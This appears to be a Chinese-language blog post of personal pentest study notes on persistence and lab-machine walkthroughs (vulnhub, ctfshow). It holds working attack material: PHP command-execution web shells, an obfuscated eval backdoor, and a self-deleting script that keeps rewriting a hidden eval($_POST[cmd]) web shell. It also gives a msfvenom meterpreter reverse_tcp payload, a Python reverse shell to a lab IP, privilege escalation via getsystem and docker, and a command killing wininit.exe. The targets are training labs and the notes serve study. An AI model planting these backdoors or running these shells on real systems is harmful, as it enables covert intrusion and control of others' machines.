---
title: 权限维持
date: 2024-01-24 20:17:48
tags:
---

### 四种执行函数

```txt
/* system('whoami');

echo exec('whoami');

echo "<br>";
$a = "ping ".$_GET['a'];
if($a){
	@system($a);
	echo "<br>";
}
passthru("whoami");

echo "<br>";
echo `whoami`;

echo "<br>";
$b = $_GET['cmd'];
if($b){
	@system($b);
	echo "<br>";
} */
// @assert($_POST['a']);
/* $addition = create_function('$a.$b','return $a+$b;');
echo $addition(2,3); */
/* $ngQK=create_function(chr(7560/210).base64_decode('cw==').chr(0x2b6-0x247).base64_decode('bQ==').chr(0423-0256),base64_decode('ZQ==').base64_decode('dg==').chr(0x168b8/0x3b8).str_rot13('y').chr(309-269).base64_decode('JA==').chr(0xb3b0/0x190).chr(78255/705).base64_decode('bQ==').base64_decode('ZQ==').str_rot13(')').chr(0x4610/0x130));
$ngQK(base64_decode('NDkxN'.'TI5O0'.'BldkF'.'sKCRf'.''.str_rot13('H').str_rot13('R').chr(077006/01066).base64_decode('VA==').base64_decode('Vg==').''.''.base64_decode('Rg==').chr(531-415).base64_decode('ag==').str_rot13('o').str_rot13('J').''.'RdKTs'.'xNDc0'.'NTg3O'.'w=='.''));


Attrib +s +a +h +r 1.txt隐藏文件1.txt
```

显示隐藏文件

![显示隐藏文件](https://raw.githubusercontent.com/20231201/123/main/显示隐藏文件.png)

![显示隐藏文件1](https://raw.githubusercontent.com/20231201/123/main/显示隐藏文件1.png)

### 创建一个隐藏文件并在生效后自我删除的例子：

```txt
<?php
ignore_user_abort(); //关掉浏览器，PHP脚本也可以继续执行.
set_time_limit(0);//通过set_time_limit(0)可以让程序无限制的执行下去
$interval = 5; // 每隔*秒运行
do {
$filename = 'test.php';
if(file_exists($filename)) {
echo "xxx";
}
else {
$file = fopen("test.php", "w");
$txt = "<?php @eval($"."_POST[cmd]);phpinfo(); ?>\n";    //木马密码cmd
fwrite($file, $txt);
fclose($file);
eval(system("Attrib +s +a +h +r test.php")); //隐藏文件
unlink(__FILE__);
}
sleep($interval);
} while (true);
?>
```

### 2024年1月22日靶机关键代码

```txt



msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.60 lport=4444 -f exe -o 1.exe

run 双击木马
chcp 65001
whoami
exit
getsystem
shell
whoami
tasklist /SVC(复制后去https://i.hacking8.com/tiquan识别杀毒软件)
普通用户：systeminfo（复制去https://i.hacking8.com/tiquan看漏洞）




ps
migrate 4176(explorer.exe的id)

taskkill /F /T /IM wininit.exe
```

![copy](https://raw.githubusercontent.com/20231201/123/main/copy.png)

![copy复制文件至该文件夹](https://raw.githubusercontent.com/20231201/123/main/copy复制文件至该文件夹.png)

![不可修改文件夹的创建与删除](https://raw.githubusercontent.com/20231201/123/main/不可修改文件夹的创建与删除.png)

### ctfshow

敏感信息泄露：https://blog.csdn.net/qq_65165505/article/details/133783811

![11](https://raw.githubusercontent.com/20231201/123/main/11.png)

![12](https://raw.githubusercontent.com/20231201/123/main/12.png)

![12.](https://raw.githubusercontent.com/20231201/123/main/12..png)

![13](https://raw.githubusercontent.com/20231201/123/main/13.png)

![13.](https://raw.githubusercontent.com/20231201/123/main/13..png)

![14](https://raw.githubusercontent.com/20231201/123/main/14.png)

![14.](https://raw.githubusercontent.com/20231201/123/main/14..png)

![14..](https://raw.githubusercontent.com/20231201/123/main/14...png)

![16探针](https://raw.githubusercontent.com/20231201/123/main/16探针.png)

![16phpinfo](https://raw.githubusercontent.com/20231201/123/main/16phpinfo.png)

![18](https://raw.githubusercontent.com/20231201/123/main/18.png)

![18根据代码](https://raw.githubusercontent.com/20231201/123/main/18根据代码.png)

![19](https://raw.githubusercontent.com/20231201/123/main/19.png)

![19.](https://raw.githubusercontent.com/20231201/123/main/19..png)

![20](https://raw.githubusercontent.com/20231201/123/main/20.png)

![20.](https://raw.githubusercontent.com/20231201/123/main/20..png)

### 1月24日靶机

参考https://www.yuque.com/g/sunwu-pbywz/baji/wtlm0gprmfztttk4/collaborator/join?token=oS4LR7481GpyvBTl&source=doc_collaborator# 《01 vulnhub-BoredHackerBlog: Social Network》

md5解密:https://www.somd5.com/

关键代码：

```txt
ifdown eth0
ifup eth 0
arp-scan -l -i etho
nmap -p- ip
nmap -p duanko -sV ip
dirsearch -u wangzhi -r
nc -nvlp 4444

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

ifconfig
for i in $(seq 1 254); do ping -c 1 172.17.0.$i; done
python -c 'import pty; pty.spawn("/bin/bash")'     
ctrl +z 
stty raw -echo;fg;reset 


/

docker学习笔记：https://blog.csdn.net/qq_16452745/article/details/103181663
apt install docker
docker search wordpress
docker pull homebrew/ubuntu16.04
docker ps(查看正在运行的镜像)
docker run -itd --name ubuntu16 homebrew/ubuntu16.04 /bin/bash
docker ps
docker exec -it ubuntu16  /bin/bash
	whoami
	id
	sudo su
	whoami
	cd /root
	ls -al
	exit
	exit
docker cp 37292.c ubuntu16:/root/



```

![1](https://raw.githubusercontent.com/20231201/123/main/1.png)

![2扫描](https://raw.githubusercontent.com/20231201/123/main/2扫描.png)

![3admin页面](https://raw.githubusercontent.com/20231201/123/main/3admin页面.png)

![4连接](https://raw.githubusercontent.com/20231201/123/main/4连接.png)

![加固](https://raw.githubusercontent.com/20231201/123/main/加固.png)

![5查看为docker容器](https://raw.githubusercontent.com/20231201/123/main/5查看为docker容器.png)

![6venom](https://raw.githubusercontent.com/20231201/123/main/6venom.png)

![7链接venom](https://raw.githubusercontent.com/20231201/123/main/7链接venom.png)

![7.](https://raw.githubusercontent.com/20231201/123/main/7..png)

![8查看控制venom节点，启动隧道](https://raw.githubusercontent.com/20231201/123/main/8查看控制venom节点，启动隧道.png)

![编辑venom配置文件并扫描](https://raw.githubusercontent.com/20231201/123/main/编辑venom配置文件并扫描.png)

![扫描1](https://raw.githubusercontent.com/20231201/123/main/扫描1.png)

![扫描2](https://raw.githubusercontent.com/20231201/123/main/扫描2.png)

![扫描3](https://raw.githubusercontent.com/20231201/123/main/扫描3.png)

![搜索Elasticsearch漏洞并查看python使用版本](https://raw.githubusercontent.com/20231201/123/main/搜索Elasticsearch漏洞并查看python使用版本.png)

![写入数据并攻击该端口](https://raw.githubusercontent.com/20231201/123/main/写入数据并攻击该端口.png)

![登录账号并尝试提权](https://raw.githubusercontent.com/20231201/123/main/登录账号并尝试提权.png)

![docker](https://raw.githubusercontent.com/20231201/123/main/docker.png)

![docker1](https://raw.githubusercontent.com/20231201/123/main/docker1.png)

![docker提权](https://raw.githubusercontent.com/20231201/123/main/docker提权.png)

1月25日靶机：https://www.yuque.com/sunwu-pbywz/baji/it8hxy8y3sgl1f03

































